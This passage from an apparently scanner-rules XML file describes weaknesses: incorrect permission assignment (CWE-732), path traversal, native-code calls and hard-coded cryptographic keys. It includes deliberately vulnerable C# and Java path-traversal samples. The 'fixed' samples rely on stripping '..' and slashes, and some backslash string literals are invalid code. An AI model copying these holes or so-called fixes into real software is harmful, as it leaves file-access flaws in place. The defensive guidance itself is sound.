configuration to the settings that you recommend in the manual.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use tools and techniques that require manual (human) analysis, such as
penetration testing, threat modeling, and interactive tools that allow
the tester to record and modify an active session. These may be more
effective than strictly automated techniques. This is especially the
case with weaknesses that are related to design and business
rules.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use monitoring tools that examine the software's process as it
interacts with the operating system and the network. This technique is
useful in cases when source code is unavailable, if the software was not
developed by you, or if you want to verify that the build phase did not
introduce any new weaknesses. Examples include debuggers that directly
attach to the running process; system-call tracing utilities such as
truss (Solaris) and strace (Linux); system activity monitors such as
FileMon, RegMon, Process Monitor, and other Sysinternals utilities
(Windows); and sniffers and protocol analyzers that monitor network
traffic.&lt;/p&gt;&lt;p&gt;Attach the monitor to the process and watch for library functions or
system calls on OS resources such as files, directories, and shared
memory. Examine the arguments to these calls to infer which permissions
are being used.&lt;/p&gt;&lt;p&gt;Note that this technique is only useful for permissions issues related
to system resources. It is not likely to detect application-level
business rules that are related to permissions, such as if a user of a
blog system marks a post as "private," but the blog system inadvertently
marks it as "public."&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Testing; System Configuration&lt;/p&gt;&lt;p&gt;Ensure that your software runs properly under the Federal Desktop Core
Configuration (FDCC) or an equivalent hardening configuration guide,
which many organizations use to limit the attack surface and potential
risk of deployed software.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_732_Relationships" id="oc_732_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;275&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=275" target="_blank"&gt;Permission Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;668&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=668" target="_blank"&gt;Exposure of Resource to Wrong Sphere&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;753&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=753" target="_blank"&gt;2009 Top 25 - Porous Defenses&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2009 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;750&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;803&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=803" target="_blank"&gt;2010 Top 25 - Porous Defenses&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2010 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;800&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;RequiredBy&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Compound Element: Composite&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;689&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=689" target="_blank"&gt;Permission Race Condition During Resource Copy&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;276&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=276" target="_blank"&gt;Incorrect Default Permissions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;277&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=277" target="_blank"&gt;Insecure Inherited Permissions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;278&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=278" target="_blank"&gt;Insecure Preserved Inherited Permissions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;279&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=279" target="_blank"&gt;Incorrect Execution-Assigned Permissions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;281&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=281" target="_blank"&gt;Improper Preservation of Permissions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_732_Related Attack Patterns" id="oc_732_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org232.html" target="_blank"&gt;232&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Exploitation of Privilege/Trust&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org1.html" target="_blank"&gt;1&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing Functionality Not Properly Constrained by ACLs&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org17.html" target="_blank"&gt;17&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing, Modifying or Executing Executable Files&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org60.html" target="_blank"&gt;60&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Reusing Session IDs (aka Session Replay)&lt;/td&gt;&lt;/tr&gt;

&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org61.html" target="_blank"&gt;61&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Session Fixation&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org62.html" target="_blank"&gt;62&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Cross Site Request Forgery (aka Session Riding)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org122.html" target="_blank"&gt;122&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Exploitation of Authorization&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org180.html" target="_blank"&gt;180&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Exploiting Incorrectly Configured Access Control Security Levels&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org234.html" target="_blank"&gt;234&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Hijacking a privileged process&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_732_References" id="oc_732_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Mark Dowd, John McDonald
and Justin Schuh. "The Art of Software Security Assessment". Chapter 9, "File Permissions." Page 495.. 1st Edition. Addison Wesley. 2006. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;John Viega and
Gary McGraw. "Building Secure Software". Chapter 8, "Access Control." Page 194.. 1st Edition. Addison-Wesley. 2002. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div name="oc_732_Maintenance Notes" id="oc_732_Maintenance Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The relationships between privileges, permissions, and actors (e.g. users
and groups) need further refinement within the Research view. One
complication is that these concepts apply to two different pillars, related
to control of resources (CWE-664) and protection mechanism failures
(CWE-396).&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_732_Content History" id="oc_732_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal CWE Team&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;new weakness-focused entry for Research
view.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Likelihood of Exploit, Name,
Potential Mitigations, Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Name&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Common Consequences,
Demonstrative Examples, Detection Factors, Modes of Introduction,
Observed Examples, Potential Mitigations, References&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-04-05&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations, Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-01-12&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Insecure Permission
Assignment for Resource&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2009-05-27&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Insecure Permission
Assignment for Critical Resource&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3618</key><name>Input_Path_Not_Canonicalized</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could define any arbitrary file path for the application to use, potentially leading to:&lt;/div&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;Stealing sensitive files, such as configuration or system files&lt;/li&gt;
&lt;li&gt;Overwriting files such as program binaries, configuration files, or system files&lt;/li&gt;
&lt;li&gt;Deleting critical files, causing a denial of service (DoS).&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses user input in the file path for accessing files on the application server&amp;#8217;s local disk. This enables an attacker to arbitrarily determine the file path.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, avoid depending on user input for file selection.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Accept user input only for the filename, not for the path and folders.&lt;/li&gt;
&lt;li&gt;Ensure that file path is fully canonicalized.&lt;/li&gt;
&lt;li&gt;Explicitly limit the application to using a designated folder that separate from the applications binary folder.&lt;/li&gt;
&lt;li&gt;Restrict the privileges of the application&amp;#8217;s OS user to necessary files and folders. The application should not be able to write to the application binary folder, and should not read anything outside of the application folder and data folder.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class PathTraversal
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text;
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters are removed from the user input before use
      &lt;/h4&gt;&lt;pre&gt;public class PathTraversalFixed
{
        private void foo(TextBox textbox1)
        {
                string fileNum = textbox1.Text.Replace("\", "").Replace("..", "");
                string path = "c:\files\file" + fileNum;
                FileStream f = new FileStream(path, FileMode.Open);
                byte[] output = new byte[10];
                f.Read(output,0, 10);
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Using unvalidated user input as the file name may enable the user to access arbitrary files on the server local disk&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;h4&gt;Potentially hazardous characters are removed from the user input before use&lt;/h4&gt;&lt;pre&gt;public class Absolute_Path_Traversal_Fixed {
    public static void main(String[] args) {
        Scanner userInputScanner = new Scanner(System.in);
        System.out.print("\nEnter file name: ");
        String name = userInputScanner.nextLine();
        name = name.replace("/", "").replace("..", "");
        String path = "c:\files\file" + name;
        try {
            BufferedReader reader = new BufferedReader(new FileReader(path));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_624</key><name>Use_of_Native_Language</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Low-level functionality may expose code to vulnerabilities that are mitigated in a language by design, by circumventing the language's built-in defenses.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;In many modern languages, certain functionality is managed by the language itself. By invoking low-level functionality, the language's intrinsic defenses are bypassed, allowing potentially dangerous usage of functionality that is otherwise not allowed by the core language.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Do not invoke low-level functionality unless explicitly required; consider a more secure alternative that is supported by the language&lt;/li&gt;
&lt;li&gt;If required, ensure that this low-level functionality holds the same coding standards as its invoking language, and undergoes any and all security processes that the invoking language undergoes, as well as additional processes dedicated to the invoked low-level library.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CPP&lt;/h3&gt;&lt;h4&gt;Native DLL PInvoke Importation&lt;/h4&gt;&lt;pre&gt;[DllImport("external_dll.dll")]
private static extern int write_to_array(int array_length, char array[]); &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_632</key><name>Use_of_Hard_coded_Cryptographic_Key</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Static, unchangeable encryption keys in the source code can be stolen by an attacker with access to the source code or the application binaries. Once the attacker has the encryption key, this can be used to gain access to any encrypted secret data, thus violating the confidentiality of the data. Furthermore, it would be impossible to replace the encryption key once stolen. Note that if this is&amp;#160;a product that can be installed numerous times, the encryption key will always be the same, allowing an attacker to break all instances at the same cost.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application code uses an encryption key to encrypt and decrypt sensitive data. While it is important to create this encryption key randomly and keep it secret, the application has a single, static key embedded in plain text in the source code.&amp;#160;&lt;/div&gt;
